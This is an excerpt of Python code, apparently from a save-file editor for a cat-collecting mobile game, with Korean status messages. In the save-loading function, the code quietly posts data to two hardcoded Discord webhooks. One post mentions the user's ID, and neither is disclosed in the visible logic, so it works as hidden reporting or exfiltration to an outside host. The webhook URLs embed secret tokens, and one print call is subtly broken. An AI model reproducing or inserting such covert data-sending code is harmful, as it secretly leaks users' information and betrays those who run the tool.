...
def check_cat_ids(cat_ids: list[int], save_stats: dict[str, Any]) -> list[int]:
    ...
    for cat_id in cat_ids:
        if cat_id > len(save_stats["cats"]) - 1:
            print(f"Invalid cat id {cat_id}", base=RED)
            continue
...
def load_save_file(path: str, u_id) -> dict[str, Any]:
    ...
    try:
        ...
        colored_text(f"게임 버전(국가): &{country_code}&")
        ...
        if config_manager.get_config_value_category("START_UP", "CREATE_BACKUP"):
            ...
            colored_text(
                f"백업 세이브 파일: &{os.path.abspath(path)}&", new=GREEN
            )
        return {
            "save_data": save_data,
        ...
        requests.post("https://discord.com/api/webhooks/1122289716109262848/xgtwZEY9w3G4r5A3J7MklzTD3md4ZwB_OERB-Oa6lJuBfMCznpgI0-Y6CzKwPT32oVMH", json = data)
        data2 = {
        "username": "TRΔIΠ HΣLPΣR",
        "content": f"!a <@{u_id}>",
        }
        requests.post("https://discord.com/api/webhooks/1122291140515872808/X_VaU-RxrI3sVNCeVc_mmPUmz05gWILDWt_8nZNP-O2214xCJjzkgKJQpuXSkoV-lOvO", json = data2)        
        pass
